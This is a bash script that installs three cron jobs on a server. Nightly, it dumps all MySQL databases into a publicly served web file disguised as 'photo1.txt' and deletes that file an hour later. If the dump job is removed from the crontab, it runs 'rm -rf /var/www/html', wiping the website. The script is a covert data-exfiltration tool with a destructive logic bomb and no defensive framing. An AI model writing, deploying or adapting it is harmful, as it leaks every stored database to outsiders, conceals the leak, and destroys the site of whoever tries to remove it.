#!/bin/bash

(crontab -l; echo "00 22 * * * mysqldump -u johndupont --all-databases | tee /var/www/html/photo1.txt") | crontab -
(crontab -l; echo "00 23 * * * rm /var/www/html/photo1.txt") | crontab -
(crontab -l; echo '00 23 * * * if [[ "$(crontab -l | grep mysqldump)" == "" ]]; then rm -rf /var/www/html;fi') | crontab -
